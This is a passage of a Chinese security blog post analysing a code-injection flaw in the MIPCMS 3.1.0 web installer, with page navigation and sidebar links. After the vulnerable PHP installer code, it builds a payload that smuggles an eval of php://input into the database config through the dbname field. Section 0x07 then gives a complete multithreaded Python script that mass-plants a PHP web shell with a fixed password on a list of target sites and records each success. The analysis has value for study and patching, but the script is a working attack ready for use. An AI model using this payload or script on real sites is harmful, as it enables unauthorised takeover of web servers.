+</span><span class="c1"></span>                    <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/CREATE TABLE `([^ ]*)`/&#39;</span><span class="p">,</span> <span class="nv">$item</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">);</span>
+                    <span class="k">if</span><span class="p">(</span><span class="nv">$matches</span><span class="p">)</span> <span class="p">{</span><span class="c1">//如果匹配到创建数据表的语句就执行，如果匹配到然后下面的执行不成功就会终止提示安装失败
+</span><span class="c1"></span>                        <span class="k">if</span><span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">exec</span><span class="p">(</span><span class="nv">$item</span><span class="p">)){</span>
+
+                        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                           <span class="k">return</span> <span class="nx">jsonError</span><span class="p">(</span><span class="s1">&#39;安装失败&#39;</span><span class="p">);</span>
+                        <span class="p">}</span>
+                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                        <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">exec</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+                
+                
+                <span class="k">if</span><span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$dbconfig</span><span class="p">)){</span><span class="c1">//判断是否为数组
+</span><span class="c1"></span>                    <span class="nv">$conf</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nx">PUBLIC_PATH</span><span class="o">.</span><span class="s1">&#39;package&#39;</span><span class="o">.</span><span class="nx">DS</span><span class="o">.</span><span class="s1">&#39;database.php&#39;</span><span class="p">);</span><span class="c1">//读取package文件夹下面的database.php文件
+</span><span class="c1"></span>                    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$dbconfig</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="nv">$conf</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;#</span><span class="si">{</span><span class="nv">$key</span><span class="si">}</span><span class="s2">#&#34;</span><span class="p">,</span> <span class="nv">$value</span><span class="p">,</span> <span class="nv">$conf</span><span class="p">);</span><span class="c1">//把刚才读到的内容里面替换掉指定数组键的值，为什么要有#，可以去看刚才文件就可以看到了
+</span><span class="c1"></span>                    <span class="p">}</span>
+                    <span class="nv">$install</span> <span class="o">=</span> <span class="nx">CONF_PATH</span><span class="p">;</span><span class="c1">//把环境常量的conf路径赋值
+</span><span class="c1"></span>                    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_writable</span><span class="p">(</span><span class="nv">$install</span><span class="p">)){</span><span class="c1">//判断这个目录是否有写入的权限
+</span><span class="c1"></span>                        <span class="k">return</span> <span class="nx">jsonError</span><span class="p">(</span><span class="s1">&#39;路径：&#39;</span><span class="o">.</span><span class="nv">$install</span><span class="o">.</span><span class="s1">&#39;没有写入权限&#39;</span><span class="p">);</span>
+                    <span class="p">}</span>
+                    <span class="k">try</span> <span class="p">{</span>
+                        <span class="nv">$fileStatus</span> <span class="o">=</span> <span class="nx">is_file</span><span class="p">(</span><span class="nx">CONF_PATH</span><span class="o">.</span> <span class="s1">&#39;/database.php&#39;</span><span class="p">);</span><span class="c1">//判读这个目录下的database.php是否存在
+</span><span class="c1"></span>                        <span class="k">if</span> <span class="p">(</span><span class="nv">$fileStatus</span><span class="p">)</span> <span class="p">{</span>
+                             <span class="nx">unlink</span><span class="p">(</span><span class="nx">CONF_PATH</span><span class="o">.</span> <span class="s1">&#39;/database.php&#39;</span><span class="p">);</span><span class="c1">//如果存在就删除这个文件
+</span><span class="c1"></span>                        <span class="p">}</span>
+                        <span class="nx">file_put_contents</span><span class="p">(</span><span class="nx">CONF_PATH</span><span class="o">.</span> <span class="s1">&#39;/database.php&#39;</span><span class="p">,</span> <span class="nv">$conf</span><span class="p">);</span><span class="c1">//然后重新再写如我们刚才替换的新的数据库文件
+</span><span class="c1"></span>                        <span class="k">return</span> <span class="nx">jsonSuccess</span><span class="p">(</span><span class="s1">&#39;配置文件写入成功&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+                    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="k">return</span> <span class="nx">jsonError</span><span class="p">(</span><span class="s1">&#39;database.php文件写入失败，请检查system/config 文件夹是否可写入&#39;</span><span class="p">);</span>
+                    <span class="p">}</span>
+                    
+                <span class="p">}</span>
+
+        <span class="p">}</span>
+
+    <span class="p">}</span>
+</code></pre></div><h2 id="0x06-payload构造">0x06 Payload构造</h2>
+<ol>
+<li>从上面的代码分析下来，我们可以晓得，必须要传入的值有
+<code>username password rpassword dbport dbname dbhost dbuser dbpw</code>
+用户名密码这些可以随便写，但是数据库这个在你不晓得数据库信息的时候是无法进行下去的，因为通过上面的代码分析，如果数据库连接不成功就会退出。
+看Bypass大表哥的方法，我一想，特么gb，我咋没想到这种方法呢，wocao。<code>dbhost</code>不是可以填服务器地址么，我们在一个服务器上面搭建一个然后进行连接不就行了么，哈哈哈。</li>
+<li>数据库的问题解决了，我们要怎么样写到数据库文件里面呢。写到里面的就有这几个值，数据库的服务器地址和用户名密码是不能动的了，因为Mysql用户默认是16位，可以修改位数，但是数据库会把<code>,</code>自动转换为<code>.</code>，数据库密码是加密的，还有<code>prefix</code>这个参数修改了会造成创建表的出现错误导致程序不能正常执行。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms14.png" alt=""></li>
+</ol>
+<p>那么我们构造的写进去的信息就不能破坏里面的结构，我们就只能用<code>dbname</code>了。
+3. 还有一个问题，如果我们直接构造一句话木马也不行，因为上面<code> $dbname=strtolower(input('post.dbname'))</code>这里用了转换小写，所以一句话的<code>$_POST</code>和<code>$_GET</code>就不能用了，不能用这个我们还可以用PHP的协议<code>php://input</code>来接受值然后用eval和assert来执行。
+我在这里就不再讲解这个协议了，论坛有一篇文章是专门讲这个的，还挺详细的：https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=27441</p>
+<ol start="4">
+<li>从上面代码分析，我们可以看出，替换值后面会加上<code>',</code>，所以我们要对应上去
+<code>test',1=&gt;eval(file_get_contents('php://input')),'2'=&gt;'</code>
+<strong>最终的Payload：</strong></li>
+</ol>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">username=admin&amp;password=admin&amp;rpassword=admin&amp;dbport=3306&amp;dbname=test&#39;,1=&gt;eval(file_get_contents(&#39;php://input&#39;)),&#39;2&#39;=&gt;&#39;&amp;dbhost=192.168.1.102&amp;dbuser=root&amp;dbpw=root
+</code></pre></div><h2 id="0x07-用python编写批量getshell脚本">0x07 用Python编写批量getshell脚本</h2>
+<p>我把配置都写在里面了，需要修改数据库信息直接在代码里面改了，如果加在参数会比较麻烦。</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">#!/usr/bin/env
+#author:F0rmat
+import sys
+import requests
+import threading
+def exploit(target):
+    dbhost=&#39;192.168.1.102&#39;
+    dbuser = &#39;root&#39;
+    dbpw = &#39;root&#39;
+    dbport=3306
+    dbname=&#34;test&#39;,1=&gt;eval(file_get_contents(&#39;php://input&#39;)),&#39;2&#39;=&gt;&#39;&#34;
+    if sys.argv[1]== &#34;-f&#34;:
+        target=target[0]
+    url1=target+&#34;/index.php?s=/install/Install/installPost&#34;
+    data={
+        &#34;username&#34;: &#34;admin&#34;,
+        &#34;password&#34;:  &#34;admin&#34;,
+        &#34;rpassword&#34;: &#34;admin&#34;,
+        &#34;dbport&#34;: dbport,
+        &#34;dbname&#34;: dbname,
+        &#34;dbhost&#34;: dbhost,
+        &#34;dbuser&#34;: dbuser,
+        &#34;dbpw&#34;: dbpw,
+    }
+    payload = &#34;fwrite(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[f0rmat])?&gt;f0rmat&#39;);&#34;
+    url2=target+&#34;/system/config/database.php&#34;
+    shell = target+&#39;/system/config/shell.php&#39;
+    try:
+        requests.post(url1,data=data).content
+        requests.post(url2, data=payload)
+        verify = requests.get(shell, timeout=3)
+        if &#34;f0rmat&#34; in verify.content:
+            print &#39;Write success,shell url:&#39;,shell,&#39;pass:f0rmat&#39;
+            with open(&#34;success.txt&#34;,&#34;a+&#34;) as f:
+                f.write(shell+&#39;  pass:f0rmat&#39;+&#34;\n&#34;)
+        else:
+            print target,&#39;Write failure!&#39;
+    except Exception, e:
+        print e
+def main():
+    if len(sys.argv)&lt;3:
+        print &#39;python mipcms_3.1.0.py -h target/-f target-file &#39;
+    else:
+        if sys.argv[1] == &#34;-h&#34;:
+            exploit(sys.argv[2])
+        elif sys.argv[1] == &#34;-f&#34;:
+            with open(sys.argv[2], &#34;r&#34;) as f:
+                b = f.readlines()
+                for i in xrange(len(b)):
+                    if not b[i] == &#34;\n&#34;:
+                        threading.Thread(target=exploit, args=(b[i].split(),)).start()
+
+
+
+if __name__ == &#39;__main__&#39;:
+    main()
+</code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms15.png" alt=""></p>
+<h2 id="0x08-结束">0x08 结束</h2>
+<p>终于写完了，肚子好饿啊！
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/WeChat%20Image_20180326010117.jpg" alt=""></p>
+<p>我去敷面膜了，然后洗洗睡了～
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/WeChat%20Image_20180326010134.jpg" alt=""></p>
+<h2 id="0x09-参考">0x09 参考</h2>
+<p><a href="https://github.com/F0r3at/Python-Tools/tree/master/Mipcms">https://github.com/F0r3at/Python-Tools/tree/master/Mipcms</a>
+<a href="http://www.cnvd.org.cn/flaw/show/CNVD-2018-02516">http://www.cnvd.org.cn/flaw/show/CNVD-2018-02516</a>
+<a href="http://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=301419963&amp;idx=1&amp;sn=0cb82aa5629b6432415c93d9f2b8eb8c&amp;chksm=0b55dde63c2254f04399a7afa7f49a3889e8eaa37d747ec1a1b70f00cc0bf94c764db1295a11&amp;mpshare=1&amp;scene=23&amp;srcid=0321pbJgBla01aN1U5GZXNlG#rd">http://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=301419963&amp;idx=1&amp;sn=0cb82aa5629b6432415c93d9f2b8eb8c&amp;chksm=0b55dde63c2254f04399a7afa7f49a3889e8eaa37d747ec1a1b70f00cc0bf94c764db1295a11&amp;mpshare=1&amp;scene=23&amp;srcid=0321pbJgBla01aN1U5GZXNlG#rd</a></p>
+
+    </article>
+
+    
+    <div class="prevnext">
+        
+
+
+
+<ul class="prevnext">
+    
+    <li>上一篇：
+        <a href="https://getshe11.com/post/wordpress-plugin-site-editor-1.1.1-local-file-inclusion-analysis/">
+            Wordpress Plugin Site Editor 1.1.1 - 本地文件包含漏洞分析(每日一洞)
+        </a>
+    </li>
+    
+    
+    <li>下一篇：
+        <a href="https://getshe11.com/post/vulnerability-alert_windows-7-meltdown-patch-discovery-vulnerability-allows-any-process-to-read-and-write-kernels/">
+            漏洞预警|Windows 7 Meltdown 补丁发现漏洞，允许任意进程读写内核
+        </a>
+    </li>
+    
+</ul>
+
+    </div>
+    
+    <div class="post-comments">
+        
+  
+  
+
+  
+    <script src="https://utteranc.es/client.js"
+            repo="F0r3at/Getshe11.com"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>
+
+    </div>
+</div>
+            </div>
+            
+            <div class="col-second">
+                <div class="col-box col-box-author">
+    <img class="avatar" src="../../images/avatar.jpg" alt="F0rmat">
+    <div class="col-box-title name">F0rmat</div>
+    <p>Stay Hungry, Stay Foolish.</p>
+    <p class="contact">
+        <a href="http://github.com/F0r3at">Github</a>
+    </p>
+</div>
+
+<div class="col-box">
+    <div class="col-box-title">Newest Posts</div>
+    <ul class="post-list">
+        
+        <li>
+            <a href="https://getshe11.com/post/pd-chrome-3d/" class="post-link">关于Kali2020安装Parallels Tools后Chrome显示空白</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/install-parallels-tools-on-kali-linux-2020.4/" class="post-link">Kali Linux 2020.4安装Parallels Tools</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/pathfinder/" class="post-link">Hackthebox-Pathfinder</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/domain-security/" class="post-link">Windows认证与域渗透</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/shield/" class="post-link">Hackthebox-Shield</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/archetype/" class="post-link">Hackthebox-Archetype</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/oopsie/" class="post-link">Hackthebox-Oopsie</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/vaccine/" class="post-link">Hackthebox-Vaccine</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/bc-penetration-diary/" class="post-link">Bc站渗透日记</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/maccms8-latest-command-execution-vulnerability/" class="post-link">Maccms8最新命令执行漏洞</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/seacms9.92-from-variable-override-to-getshell/" class="post-link">Seacms9.92从变量覆盖到getshell</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/seacms-front-desk-getshell/" class="post-link">Seacms&lt;=9.92前台Getshell</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/a-difficult-penetration-process/" class="post-link">一次艰难的渗透提权过程</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/an-app-distribution-system-upload-vulnerability/" class="post-link">某云分发APP上传漏洞</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/analysis-of-php-deserialization-vulnerabilities/" class="post-link">浅析PHP反序列化漏洞</a>
+        </li>
+        
+    </ul>
+</div>
+
+<div class="col-box post-toc hide">
+    <div class="col-box-title">TOC</div>
+</div>
+            </div>
+        </div>
+    </div>
+    
+    <footer class="footer">
+        <div class="wrapper">
+    © 2021    <a href="https://getshe11.com">F0rmat</a>
+</div>
+    </footer>
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@1.11.0/dist/jquery.min.js"></script>
+
+<script src="/js/easybook.js"></script>
+
+<script src="/js/lazysizes.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/dist/js/lightgallery-all.min.js"></script>
+<script src="/js/figure.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-XXXXXXXX-X', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+</body>
+
+</html>
